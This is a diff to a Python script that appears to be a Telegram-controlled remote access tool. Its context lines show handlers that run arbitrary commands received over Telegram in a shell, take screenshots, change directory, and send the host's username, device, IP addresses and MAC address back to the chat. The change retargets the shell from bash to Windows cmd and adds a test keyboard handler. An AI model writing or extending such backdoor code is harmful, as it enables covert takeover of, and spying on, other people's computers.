@@ -43,7 +43,7 @@ def download_file(url,filename):
 
 def shell(query):
     global decode_charset
-    cmd = "bash"   #specify your cmd command
+    cmd = "cmd"   #specify your cmd command
     process = subprocess.Popen(query,shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
     out = process.stdout.read() + process.stderr.read()
     return out.decode(decode_charset)
@@ -82,6 +82,10 @@ def screenshot(message):
 @bot.message_handler(commands=["info"])
 def info(message):
     bot.send_message(message.chat.id, f"{util.username()}@{util.device()}({util.platform()}-x{util.architecture()}) {util.local_ip()} / {util.public_ip()} / {util.mac_address()}")
+
+@bot.message_handler(commands=["keys"])
+def keys(message):
+    bot.send_message(message.chat.id, f"keys", reply_markup={"reply_keyboard_markup":[[{"text":"KEY TEST"}]]})
 
 @bot.message_handler(commands=["cd"])
 def cd(message):
